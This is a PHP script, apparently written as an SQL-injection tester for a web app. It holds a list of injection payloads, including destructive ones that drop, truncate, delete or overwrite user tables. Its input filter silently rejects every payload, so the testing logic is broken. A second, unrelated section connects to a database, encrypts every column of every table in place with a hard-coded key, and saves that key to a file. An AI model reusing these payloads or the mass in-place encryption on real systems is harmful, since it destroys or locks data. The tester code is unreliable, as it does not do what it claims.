<?php
/*
 * Copyright (c) 2024 CodeAdvance. Todos los derechos reservados.
 * Prohibida su copia, redistribución o uso sin autorización expresa de CodeAdvance.
 */

/* Este es un script realizado para verificar vulnerabilidades en gestorplus hecho por Acnth666(Englis666)
  *  Este script está destinado a fines educativos y de seguridad, para ayudar a identificar y corregir vulnerabilidades de inyección SQL en aplicaciones web.
  *  El uso indebido de este script para realizar ataques no autorizados es ilegal y está en contra de las políticas de CodeAdvance.
  *  Asegúrate de tener permiso explícito para realizar pruebas de seguridad en cualquier sistema que no sea de tu propiedad.
  *  Utiliza este script de manera responsable y ética, respetando siempre las leyes y regulaciones locales.
  *  Este script no debe ser utilizado para realizar ataques maliciosos o ilegales.
  *  El propósito de este script es educar sobre la seguridad informática y ayudar a los desarrolladores a mejorar la seguridad de sus aplicaciones.
  *  Si encuentras alguna vulnerabilidad, repórtala al propietario del sistema para que pueda ser corregida.
  *  Este script es proporcionado "tal cual", sin garantías de ningún tipo, ya sea expresa o implícita.
  *  El autor no se hace responsable de ningún daño o pérdida causada por el uso de este script.
  *  El uso de este script implica la aceptación de estos términos y condiciones.
  *  Si no estás de acuerdo con estos términos, no utilices este script.
  *  Este script es una herramienta de prueba de seguridad y no debe ser utilizado para realizar ataques maliciosos o ilegales.
*/
session_start();
if (empty($_SESSION['csrf_token'])) {
    $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
}

// Solicitar la URL al usuario
echo "Por favor, introduce la URL del formulario: ";
$form_url = trim(fgets(STDIN));

$test_inputs = [
    // Inyección SQL
    "' OR 1=1 --",
    "' OR 'a'='a",
    '" OR ""="',
    "'; DROP TABLE usuarios --",
    "admin' --",
    "1' OR 'x'='x",
    "admin' UNION SELECT null, null, username, password FROM users --",
    "' OR EXISTS(SELECT * FROM users WHERE username = 'admin') --",

    // Inyección de archivos toca colocar mi ruta principal de mi pc
    "'; COPY usuarios FROM '/path/to/local/file'; --",
    "'; LOAD DATA LOCAL INFILE '/path/to/local/file' INTO TABLE usuarios; --",
    "'; CREATE TABLE new_table AS SELECT * FROM usuarios; --",

    // Otras inyecciones y exploits
    "'; DELETE FROM usuarios; --",
    "'; UPDATE usuarios SET password = 'newpassword' WHERE username = 'admin'; --",
    "'; INSERT INTO usuarios (username, password) VALUES ('newuser', 'newpassword'); --",
    "'; TRUNCATE TABLE usuarios; --",
    "'; SHOW TABLES; --",
];

foreach ($test_inputs as $input){
    if (preg_match('/[^\w\s]/', $input)) {
        echo "Entrada no válida detectada: $input\n";
        continue;
    }

    $data = [
        'num_doc' => $input,
        'password' => '123456',
        'csrf_token' => $_SESSION['csrf_token'],
    ];

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $form_url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));

    $response = curl_exec($ch);

    if ($response === false) {
        echo "Error en la solicitud cURL: " . curl_error($ch) . "\n";
    }

    curl_close($ch);

    // Implementar un retraso para detectar patrones anómalos (como inyección SQL)
    if (strpos($input, "' OR") !== false || strpos($input, "'--") !== false) {
        sleep(2);  // Retraso artificial de 2 segundos para detectar posibles ataques
    }

    echo "Probando con: $input\n";
    echo "Respuesta: $response\n\n";

    // Validar la respuesta en busca de posibles vulnerabilidades SQL
    if (strpos($response, 'Error') !== false || strpos($response, 'SQL') !== false || strpos($response, 'mysqli') !== false) {
        echo "Posible vulnerabilidad detectada en: $input\n";
    }
}

// Función para cifrar datos
function encryptData($data, $key) {
    $iv = openssl_random_pseudo_bytes(openssl_cipher_iv_length('aes-256-cbc'));
    $encrypted = openssl_encrypt($data, 'aes-256-cbc', $key, 0, $iv);
    return base64_encode($iv . $encrypted);
}

// Función para descifrar datos
function decryptData($data, $key) {
    $data = base64_decode($data);
    $iv = substr($data, 0, openssl_cipher_iv_length('aes-256-cbc'));
    $encrypted = substr($data, openssl_cipher_iv_length('aes-256-cbc'));
    return openssl_decrypt($encrypted, 'aes-256-cbc', $key, 0, $iv);
}

// Solicitar credenciales de la base de datos
echo "Por favor, introduce el host de la base de datos: ";
$host = trim(fgets(STDIN));
echo "Por favor, introduce el usuario de la base de datos: ";
$usuario = trim(fgets(STDIN));
echo "Por favor, introduce la contraseña de la base de datos: ";
$contrasena = trim(fgets(STDIN));
echo "Por favor, introduce el nombre de la base de datos: ";
$nombre_base_de_datos = trim(fgets(STDIN));

// Clave de cifrado (debería ser segura y secreta)
$encryptionKey = 'tu_clave_secreta_de_cifrado';

$conexion = mysqli_connect($host, $usuario, $contrasena, $nombre_base_de_datos);
if (!$conexion) {
    die("Error de conexión: " . mysqli_connect_error());
}

// Obtener todas las tablas de la base de datos
$result = mysqli_query($conexion, "SHOW TABLES");
$tables = [];
while ($row = mysqli_fetch_row($result)) {
    $tables[] = $row[0];
}

foreach ($tables as $table) {
    // Obtener todas las columnas de la tabla
    $result = mysqli_query($conexion, "SHOW COLUMNS FROM `$table`");
    $columns = [];
    while ($row = mysqli_fetch_assoc($result)) {
        $columns[] = $row['Field'];
    }

    // Seleccionar todos los registros de la tabla
    $result = mysqli_query($conexion, "SELECT * FROM `$table`");
    while ($row = mysqli_fetch_assoc($result)) {
        $newRow = [];
        foreach ($columns as $column) {
            if ($column !== 'id') { // Asumiendo que 'id' es la clave primaria y no debe ser cifrada
                $newRow[$column] = encryptData($row[$column], $encryptionKey);
            } else {
                $newRow[$column] = $row[$column];
            }
        }

        // Actualizar la fila con los datos cifrados
        $updateQuery = "UPDATE `$table` SET ";
        $updateValues = [];
        foreach ($newRow as $col => $val) {
            $updateValues[] = "`$col` = '$val'";
        }
        $updateQuery .= implode(', ', $updateValues) . " WHERE id = " . $row['id'];
        mysqli_query($conexion, $updateQuery);
    }
}

echo "Todos los datos han sido cifrados exitosamente.";

// Guardar la clave de cifrado en un archivo para futuro descifrado
file_put_contents('encryption_key.txt', $encryptionKey);
?>